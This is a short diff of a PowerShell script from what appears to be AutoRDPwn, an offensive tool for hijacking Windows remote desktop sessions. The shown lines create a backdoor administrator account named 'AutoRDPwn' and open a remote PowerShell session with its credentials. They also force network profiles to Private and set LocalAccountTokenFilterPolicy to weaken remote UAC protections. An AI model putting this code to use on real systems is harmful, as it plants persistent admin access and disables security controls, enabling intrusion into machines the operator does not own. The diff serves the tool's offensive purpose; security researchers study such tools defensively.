@@ -183,7 +183,8 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
         
       } until ($input -in '1','2','3','4','5')
 
-   $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "" ; if ($hash) { $user = AutoRDPwn ; $password = AutoRDPwn | ConvertTo-SecureString -AsPlainText -Force }
+   $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "" ; if ($hash) { echo "AutoRDPwn" > credentials.dat 
+   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat }
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) ; $RDP = New-PSSession -Computer $computer -credential $credential ; $Host.UI.RawUI.ForegroundColor = 'Yellow'
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
